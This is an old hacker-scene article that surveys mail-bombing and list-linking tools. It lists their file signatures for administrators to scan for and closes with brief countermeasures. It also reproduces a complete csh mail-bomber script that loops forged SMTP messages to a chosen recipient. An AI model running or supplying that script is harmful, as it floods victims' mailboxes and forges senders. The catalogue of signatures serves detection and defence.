 Important Note
 ==============
 The writers of this article nor BSRF believe that mail bombing and
 list linking are against the law, and should not be carried out nor
 tolerated by anyone. In fact, these are two of the dumbest things you
 could do on the net, and will only get you mocked. Such attacks are
 only carried out by kids with too much time in their hands, who are
 not smart enough to carry out more sophisticated attacks.

 Know Your Enemy
 ===============

 Up Yours:
 
 The Up Yours mail-bombing program is probably the most popular bomber 
 out there. It uses minimal resources, does a superb job, has a simple 
 user interface, and attempts to obscure the attacker's source 
 address. Features of the program include being able to specify times 
 of day to start and stop as well as the number of messages with which 
 it will hammer the target.
 
 This bomber runs only on the Microsoft Windows platform. If you are a 
 system administrator, you will want to scan your local drives for the 
 following files:
 
 upyours.exe
 upyours2.zip
 upyours3.zip
 
 If these files appear in a user's directory, there is a strong 
 likelihood that he is about to e-mail bomb someone (of course, 
 perhaps he simply spends his time collecting hacking and cracking 
 programs). In any event, the utility is hard to find. If one of your 
 users has acquired this program, he clearly has an interest in 
 hacking or cracking :o)
 
 KaBoom:
 
 KaBoom differs significantly from Up Yours. In the main program, you 
 find a utility to list link. Using this function, you can subscribe 
 your target to hundreds of e-mail lists. When I say that a target has 
 been list-linked, I mean the target has been subscribed (without his 
 consent) to one or more mailing lists. Such tools submit registration 
 requests on behalf of the victim, forging his e-mail address. In any 
 event, this utility's signature files are these:
 
 kaboom!3.zip
 kaboom3.exe
 
 Avalanche:
 
 The Avalanche e-mail bombing utility works smoothly and is well 
 designed. The list groups are displayed in a drop-down combo box, and 
 their individual lists are displayed in a list box. Three clicks of a 
 mouse and your target is in hot water.
 
 TIP: The programmer here was a bit absentminded. The program was 
 written at least in part in Microsoft Visual Basic 4.0. As such, 
 there are a series of DLL files that are required to run the 
 application. These are missing from the general distribution of this 
 utility; therefore, serious bombers must go out onto the Internet to 
 retrieve those files (one is OC2.DLL). Because of this, I would 
 estimate that Avalanche is probably used less than its counterparts, 
 even though its overall design is superior. Inconvenience discourages 
 most users of this particular ilk. The signature files for this 
 product are:
 
 alanch10.zip
 avalanche20.zip
 avalanche.exe
 
 Unabomber:
 
 The Unabomber utility is a rudimentary tool, but one must give the 
 author credit for humor. Unabomber offers no list-linking 
 capabilities. It is essentially a flat e-mail bomber and does no more 
 than send messages over and over. One interesting element is that 
 Unabomber comes with a help function. The signature files for this 
 utility are:
 
 unabomb.zip
 unabomb.exe
 
 eXtreme Mail:
 
 eXtreme Mail is well programmed. It includes an interactive 
 installation process that performs all the routine checks for disk 
 space, resources, and so forth. It also observes proper registry 
 conventions and is easily uninstalled.
 The signature files for this product are:
 
 xmailb1.zip
 xmailb1.exe
 
 Homicide:
 
 The Homicide utility was written by a youngster with the moniker Frys 
 and was discontinued in 1996. The author claims that he wrote the 
 utility because Up Yours 2.0 was inadequate as an e-mail bombing 
 tool. However, with the release of Up Yours 3.0, Frys apparently 
 decided to discontinue any further releases. As of March 1997, it is 
 available only at a very few select sites. 
 The signature files for this utility are:
 
 homicide.zip
 homicide.exe
 
 The UNIX MailBomb:
 
 This UNIX e-mail bomber is reportedly written by CyberGoat, an 
 anonymous cracker out in the void. The signature file on this one is 
 mailbomb.csh.
 It is in fact a CSH shell script and not a program, since Unix has
 such powerful shells and shell scripting capabilities. It's main
 advantage is that it is very small in size.
 
 #!/bin/csh
 # Anonymous Mailbomber
 # do chmod u+rwx <filename> where filename is the name of the file 
 that
 # you saved it as.
 #*** WARNING - THIS WILL CREATE AND DELETE A TEMP FILE CALLED
 # "teltemp"
 # IN THE DIRECTORY IT IS RUN FROM ****
 clear
 echo -n "What is the name or address of the smtp server ?"
 set server = $<
 #echo open $server 25 > teltemp
 echo quote helo somewhere.com >> teltemp
 #The entry for the following should be a single name (goober),
 #not goober@internet.address <mailto:goober@internet.address>.
 echo -n "Who will this be from (e.g. somebody) ?"
 set from = $<
 echo quote mail from: $from >> teltemp
 echo -n "Who is the lucky recipient (e.g. someone@somewhere) ? "
 set name = $<
 echo quote rcpt to: $name >> teltemp
 echo quote data >> teltemp
 echo quote . >> teltemp
 echo quote quit >> teltemp
 echo quit >> teltemp
 echo -n "How many times should it be sent ?"
 set amount = $<
 set loop_count = 1
 while ($loop_count <= $amount)
 echo "Done $loop_count"
 ftp -n $server 25 < teltemp
 @ loop_count++
 end
 rm ./teltemp
 echo $amount e-mails complete to $name from $from@$server

 Bombtrack:
 
 The Bombtrack utility is reportedly the first mail-bombing tool 
 written for the Macintosh platform. It is another run-of-the-mill 
 bombing utility, widely available at cracker sites across the 
 Internet. The signature file for this application is:
 
 bombtrack.bin
 
 FlameThrower:
 
 FlameThrower is a bombing utility written for Macintosh. Its main 
 purpose is list linking; it allows the user to subscribe his target 
 to 100 lists. The binary is quite large, considering its intended 
 purpose. The signature for this file is:
 
 flamethrower10b.sit.bin



 Mail Bombing Countermeasures
 ============================
 There are many utilities out there (such as pop3free, pop3clean
 etc') that will clean up POP3 mail accounts. To learn more about
 POP3, refer to BSRF's POP3 tutorial.
 As for web-based mail accounts, you can always save any real mails
 that you got and delete all the rest (any web-based mail account
 should have such a feature).
 To report such attacks, send a message to your abuse team (for
 example: if you have an account at hotmail.com, send your mail to
 abuse@hotmail.com).

 As for list linking, if you're facing a large attack and cannot
 unsubscribe from all of the mailing list by yourself, consider
 switching to another account. Sorry, there's no other way.
